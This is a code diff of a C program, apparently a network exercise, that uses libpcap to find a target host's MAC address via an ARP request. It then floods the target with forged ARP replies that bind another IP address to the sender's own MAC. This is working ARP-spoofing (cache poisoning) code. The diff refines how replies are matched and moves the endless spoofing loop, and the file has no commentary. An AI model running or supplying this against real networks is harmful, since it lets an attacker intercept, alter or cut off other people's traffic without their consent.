@@ -6,6 +6,7 @@
 #include <net/if.h>
 #include <sys/ioctl.h>
 #include <pcap.h>
+#include <time.h>
 
 struct ethernet_header{
     uint8_t dest_mac[6];
@@ -87,7 +88,6 @@ int main(int argc, char * argv[]){
     const u_char* packet;
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-
     uint8_t myip[4];
     uint8_t mymac[6];
     uint8_t netmask[4];
@@ -124,52 +124,51 @@ int main(int argc, char * argv[]){
     arp.hlen = (uint8_t)0x06;
     arp.plen = (uint8_t)0x04;
     arp.opcode = (uint16_t)ntohs(0x0001);
-    for(int i=0; i<4; i++)
-        arp.sender_ip[i] = myip[i];
-    for(int i=0; i<6; i++)
-        arp.sender_mac[i] = mymac[i];
+    for(int i=0; i<4; i++)   arp.sender_ip[i] = myip[i];
+    for(int i=0; i<6; i++)   arp.sender_mac[i] = mymac[i];
     memcpy((char*)arp.target_mac,"\x00\x00\x00\x00\x00\x00",6);
-    for(int i=0; i<4; i++)
-        arp.target_ip[i] = targetip[i];
-    pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));
+    for(int i=0; i<4; i++)   arp.target_ip[i] = targetip[i];
+    pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));	
 
     while(true){
-
-        pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));
         int res = pcap_next_ex(handle, &header, &packet);
-
         if(res == 0) continue;
         if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
 
         struct arp_header * arp_message = (arp_header *)packet;
-
         if(ntohs(arp_message->opcode) == 0x0002){
-            printf("capture1  ");
-            if(!strcmp((char *)arp_message->sender_ip, (char *)targetip)){
-                printf("capture2  ");
+            int i;
+            for(i=0; i<4 ; i++){
+                if(arp_message->sender_ip[i] != targetip[i])
+                    break;
+            }
+            if(i==4){
                 for(int i=0; i<6; i++){
-                   targetmac[i] = arp_message->sender_mac[i];
+                    targetmac[i] = arp_message->sender_mac[i];
                 }
+                break;
             }
         }else{
             continue;
         }
+    }
 
-        for(int i=0; i<6; i++)  arp.eth.dest_mac[i] = targetmac[i];
-        for(int i=0; i<6; i++)  arp.eth.src_mac[i] = mymac[i];
-        arp.eth.type = (uint16_t)ntohs(0x0806);
-        arp.hd_type = (uint16_t)ntohs(0x0001);
-        arp.proto_type = (uint16_t)ntohs(0x0800);
-        arp.hlen = (uint8_t)0x06;
-        arp.plen = (uint8_t)0x04;
-        arp.opcode = (uint16_t)ntohs(0x0002);
-        for(int i=0; i<4; i++)
-            arp.sender_ip[i] = senderip[i];
-        for(int i=0; i<6; i++)
-            arp.sender_mac[i] = mymac[i];
-        memcpy((char*)arp.target_mac, targetmac,6);
-        for(int i=0; i<4; i++)
-            arp.target_ip[i] = targetip[i];
+    
+    for(int i=0; i<6; i++)  arp.eth.dest_mac[i] = targetmac[i];
+    for(int i=0; i<6; i++)  arp.eth.src_mac[i] = mymac[i];
+    arp.eth.type = (uint16_t)ntohs(0x0806);
+    arp.hd_type = (uint16_t)ntohs(0x0001);
+    arp.proto_type = (uint16_t)ntohs(0x0800);
+    arp.hlen = (uint8_t)0x06;
+    arp.plen = (uint8_t)0x04;
+    arp.opcode = (uint16_t)ntohs(0x0002);
+    for(int i=0; i<4; i++)   arp.sender_ip[i] = senderip[i];
+    for(int i=0; i<6; i++)   arp.sender_mac[i] = mymac[i];
+    memcpy((char*)arp.target_mac, targetmac,6);
+    for(int i=0; i<4; i++)   arp.target_ip[i] = targetip[i];
+    
+    while(true){
+        pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));
     }
 
     pcap_close(handle);
